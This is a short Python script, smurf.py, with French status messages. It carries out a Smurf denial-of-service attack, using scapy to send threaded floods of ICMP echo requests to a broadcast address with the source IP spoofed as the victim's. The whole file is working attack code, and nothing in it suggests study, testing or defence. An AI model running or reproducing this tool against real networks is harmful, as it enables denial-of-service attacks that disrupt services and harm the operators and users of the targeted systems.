# smurf.py

import threading
from scapy.all import IP, ICMP, send
from colorama import init, Fore, Style

init(autoreset=True)

def smurf_attack(victim_ip, broadcast_ip, packet_count, thread_id):
    print(f"{Fore.CYAN}[Thread-{thread_id}] Envoi de {packet_count} paquets spoofés depuis {victim_ip} vers {broadcast_ip}{Style.RESET_ALL}")
    for i in range(packet_count):
        packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP(type=8)
        send(packet, verbose=0)
        if (i + 1) % 50 == 0:
            print(f"{Fore.YELLOW}[Thread-{thread_id}] {i + 1} paquets envoyés...")

    print(f"{Fore.GREEN}[Thread-{thread_id}] Terminé ({packet_count} paquets)")

def run_smurf_attack(victim_ip, broadcast_ip, packet_count, thread_count):
    threads = [
        threading.Thread(
            target=smurf_attack,
            args=(victim_ip, broadcast_ip, packet_count, i + 1)
        )
        for i in range(thread_count)
    ]
    for t in threads: t.start()
    for t in threads: t.join()

    total = packet_count * thread_count
    print(f"{Fore.GREEN}[✓] Smurf Attack terminée. Total envoyé : {total} paquets")
